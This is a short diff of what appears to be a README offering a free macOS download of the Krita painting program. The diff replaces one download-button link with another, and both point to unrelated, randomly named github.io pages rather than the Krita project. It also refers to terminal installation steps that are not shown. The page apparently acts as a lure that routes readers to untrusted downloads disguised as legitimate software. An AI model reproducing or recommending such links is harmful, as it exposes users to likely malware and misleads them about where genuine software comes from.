@@ -2,7 +2,7 @@
 
 Krita is a powerful, open-source digital painting and illustration software designed for artists. Follow the instructions below to download and install Krita on your macOS device for free.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/krita)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/krita)
 
 If the download button doesn’t work, follow the manual installation instructions below using the terminal.
 
